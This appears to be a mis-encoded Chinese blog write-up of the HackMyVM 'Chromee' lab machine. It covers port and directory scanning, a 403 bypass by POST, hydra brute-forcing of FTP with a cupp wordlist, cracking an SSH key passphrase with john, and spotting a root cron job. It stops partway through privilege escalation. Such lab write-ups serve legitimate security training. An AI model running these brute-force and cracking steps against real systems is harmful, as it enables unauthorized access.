  <entry>
    <title>HMV-Chromee WPå¤ç°åŠå¤ç›˜</title>
    <url>/posts/46850.html</url>
    <content><![CDATA[<p>åˆæ˜¯æ–°é¶æœºæ²¡åšå‡ºæ¥ç³»åˆ—ã€‚ã€‚ã€‚</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><p>è¿™é‡Œæœ‰ç¬¬ä¸€ä¸ªå‘ï¼Œå°±æ˜¯è¦ç”¨å…¨ç«¯å£æ‰«æï¼Œå¯ä»¥æ‰«åˆ°ä¸€ä¸ªftpç«¯å£  è¿™é‡Œç”¨ncç›´æ¥è¿ä¸Šå»å¯ä»¥çŸ¥é“æ˜¯ä»€ä¹ˆæœåŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nmap -p- 192.168.80.38 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-29 15:27 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (192.168.80.38)</span><br><span class="line">Host is up (0.0088s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">23333/tcp open  elxmgmt</span><br><span class="line">MAC Address: C8:21:58:16:CF:C4 (Intel Corporate)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.96 seconds</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc 192.168.80.38 23333 </span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ftp ä¸èƒ½ç›´æ¥åŒ¿åç™»å½• æç¤ºéœ€è¦å¯†ç  é‚£å°±å»webé‡Œæ‰¾æ‰¾ä¿¡æ¯</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>web æœ‰80ç«¯å£å’Œ8080ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.80.38 -x php,txt,jpg,js</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.80.38</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/post.php             (Status: 200) [Size: 3]</span><br><span class="line">/secret.php           (Status: 200) [Size: 549]</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.38/secret.php                                  </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;æ—©ä¸Šå¥½&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;ä¸‹åˆå¥½&#x27; : &#x27;æ™šä¸Šå¥½&#x27;);</span><br><span class="line">    $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;h1&gt;&#123;$greeting&#125;ï¼Œadriana&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;å½“å‰æ—¶é—´ï¼š&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;ä½ çš„IPï¼š&#123;$visitorIP&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    if (isset($_GET[&#x27;aaa&#x27;])) &#123;</span><br><span class="line">    	$file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;);</span><br><span class="line">    	echo $file_content;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">    		die();</span><br><span class="line">	&#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>80ç«¯å£æœ‰ä½œç”¨çš„æ˜¯è¿™ä¸ªsecret.php ä½†æ˜¯ç›´æ¥è®¿é—®å‘ç°ç›´æ¥ç»™äº†phpæºç ï¼Œæ²¡æœ‰è§£æ ,ä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ªé€»è¾‘æ˜¯å¦‚æœæœ‰aaaå‚æ•°å°±ä¼šç»™ä¸€ä¸ªå­—å…¸</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.80.38:8080 -x php,txt,jpg,js</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.80.38:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              txt,jpg,js,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/javascript           (Status: 301) [Size: 326] [--&gt; http://192.168.80.38:8080/javascript/]</span><br><span class="line">/silence              (Status: 403) [Size: 280]</span><br></pre></td></tr></table></figure></div>
<p>8080ç«¯å£ä¸€ä¸ª403çŠ¶æ€ç çš„silenceç›®å½•ï¼Œ å¦‚æœç›´æ¥è®¿é—®8080ç«¯å£ï¼Œæœ‰ä¸€ä¸ªæç¤ºï¼Œç”¨bypass  bypass403 è¿™ä¸ªæ˜¯ä¸€ä¸ªå·¥å…·å¯ä»¥å°è¯•ç»•è¿‡ä¸€äº›403</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.38:8080                                        </span><br><span class="line">&lt;h2&gt;You may need to bypass!&lt;/h2&gt;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">[+] HTTP Method Bypass</span><br><span class="line">----------------------</span><br><span class="line">GET :  Status: 403, Length : 280 </span><br><span class="line">POST :  Status: 200, Length : 616  Ã°ÂŸÂ‘ÂŒ</span><br><span class="line">â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®</span><br><span class="line"> â•°â”€&gt; PAYLOAD : curl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POST</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°ç”¨postè¯·æ±‚æ˜¯å¯ä»¥è®¿é—®çš„<br>ç”¨ç»™çš„payloadè®¿é—®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POSTcurl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POST</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POSTcurl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POST</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç»™äº†ä¸€ä¸ªåŸŸåchromee.hmv æ‰€ä»¥ä¿®æ”¹åŸŸåï¼Œä¹‹åå†è®¿é—®secret.php å°±å¯ä»¥è§£æäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl chromee.hmv/secret.php?aaa=1</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;æ—©ä¸Šå¥½ï¼Œadriana&lt;/h1&gt;&lt;p&gt;å½“å‰æ—¶é—´ï¼š2025-03-29 08:42:54&lt;/p&gt;&lt;p&gt;ä½ çš„IPï¼š192.168.80.11&lt;/p&gt;The Lost Key</span><br><span class="line"></span><br><span class="line">Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: â€œThe greatest treasure is the journey, not the prize.â€ Lily smiled, realizing the adventure was the real reward.</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç»™äº†ä¸€ä¸ªæ–‡æœ¬ï¼Œè¿™ä¸ªæ–‡æœ¬ä¸­è¿˜ç»™äº†ä¸€ä¸ªç”¨æˆ·å<code>adriana</code> ç„¶åæŠŠè¿™ä¸ªæ–‡æœ¬ç”¨cuppç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œç»™ä¸€ä¸ªæ–‡æœ¬ç”Ÿæˆå­—å…¸éƒ½ç”¨cupp<br>å¾—åˆ°å­—å…¸ä¹‹åå°±ç”¨hydraçˆ†ç ´å­—å…¸</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cupp -w tmp.txt                  </span><br><span class="line">/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;      \                     # User&quot;)</span><br><span class="line">/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;       \   \033[1;31m,__,\033[1;m             # Passwords&quot;)</span><br><span class="line">/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler&quot;)</span><br><span class="line">/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;           \033[1;31m(__)    )\ \033[1;m  &quot;)</span><br><span class="line"> ___________ </span><br><span class="line">   cupp.py!                 # Common</span><br><span class="line">      \                     # User</span><br><span class="line">       \   ,__,             # Passwords</span><br><span class="line">        \  (oo)____         # Profiler</span><br><span class="line">           (__)    )\   </span><br><span class="line">              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]</span><br><span class="line">                            [ Mebus | https://github.com/Mebus/]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      *************************************************</span><br><span class="line">      *                    WARNING!!!                 *</span><br><span class="line">      *         Using large wordlists in some         *</span><br><span class="line">      *       options bellow is NOT recommended!      *</span><br><span class="line">      *************************************************</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Do you want to concatenate all words from wordlist? Y/[N]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Do you want to add special chars at the end of words? Y/[N]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Do you want to add some random numbers at the end of words? Y/[N]:</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Leet mode? (i.e. leet = 1337) Y/[N]:</span> </span><br><span class="line"></span><br><span class="line">[+] Now making a dictionary...</span><br><span class="line">[+] Sorting list and removing duplicates...</span><br><span class="line">[+] Saving dictionary to tmp.txt.cupp.txt, counting 663 words.</span><br><span class="line">[+] Now load your pistolero with tmp.txt.cupp.txt and shoot! Good luck!</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -l adriana -P tmp.txt.cupp.txt ftp://192.168.80.38:23333         </span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-29 15:44:53</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 663 login tries (l:1/p:663), ~42 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.80.38:23333/</span><br><span class="line">[23333][ftp] host: 192.168.80.38   login: adriana   password: Lily2020</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-29 15:44:58</span><br></pre></td></tr></table></figure></div>
<p>ç™»å½•ä¸Šftpä¹‹åï¼Œè¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªå‘ï¼Œæœ‰ä¸€ä¸ª<code>...</code>æ–‡ä»¶,ç„¶åå°±æ‹¿åˆ°ä¸€ä¸ªsshç§é’¥ï¼Œå»å®¶ç›®å½•å¯ä»¥çœ‹çœ‹æœ‰å“ªäº›ç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">lftp adriana@192.168.80.38:~&gt; ls /home</span><br><span class="line">drwxr-x---    4 1000     1000         4096 Mar 09 07:59 follower</span><br><span class="line">drwxr-x---    3 1001     1001         4096 Mar 07 12:39 softly</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨johnç ´è§£ä¸€ä¸‹å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh2john id_rsa &gt; hash</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# john hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°id_rsaå¯†ç  cassandra<br>ç™»å½•åˆ°ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh follower@192.168.80.38 -p 22 -i id_rsa</span><br><span class="line">Enter passphrase for key &#x27;id_rsa&#x27;: </span><br><span class="line">-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span><br><span class="line">follower@Chromee:~$ id</span><br><span class="line">uid=1000(follower) gid=1000(follower) groups=1000(follower)</span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="follower"><a href="#follower" class="headerlink" title="follower"></a>follower</h2><p>æ²¡æœ‰sudo  æŸ¥äº†ä¸€ä¸‹followerçš„æ–‡ä»¶ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„ï¼Œä¸Šä¼ pspy64çœ‹çœ‹å®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">11</span>:<span class="number">38</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1</span>      <span class="operator">|</span> <span class="regexp">/sbin/</span><span class="keyword">init</span> </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1621</span>   <span class="operator">|</span> <span class="regexp">/usr/</span>sbin<span class="operator">/</span><span class="type">CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1622</span>   <span class="operator">|</span> <span class="regexp">/usr/</span>sbin<span class="operator">/</span><span class="type">CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1623</span>   <span class="operator">|</span> <span class="regexp">/bin/</span>sh <span class="operator">-</span>c <span class="regexp">/root/</span>script.sh </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1624</span>   <span class="operator">|</span> <span class="regexp">/bin/</span>bash <span class="regexp">/root/</span>script.sh </span><br><span class="line"><span class="operator">^</span><span class="type">CExiting</span> program<span class="operator">...</span> (interrupt)</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°ä¼šæ‰§è¡Œä¸€ä¸ª&#x2F;root&#x2F;script.sh<br>å†çœ‹çœ‹è¿™ä¸ªç›®å½•ä¸‹é¢æœ‰ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">follower@Chromee:~$ ls</span><br><span class="line">cat.gif  linpeas.sh  note.txt  pspy64</span><br><span class="line">follower@Chromee:~$ cat note.txt </span><br><span class="line">Think about rotations and the catâ€™s secrets.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">47 is not just a number, it&#x27;s a twist of fate.</span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸€ä¸ªgifæ–‡ä»¶ï¼Œç„¶åæç¤ºæ˜¯47 47 æ˜¯rot47 æŠŠè¿™ä¸ªgifæ–‡ä»¶æ‹¿åˆ°æœ¬åœ°æ¥çœ‹ä¸€ä¸‹</p>
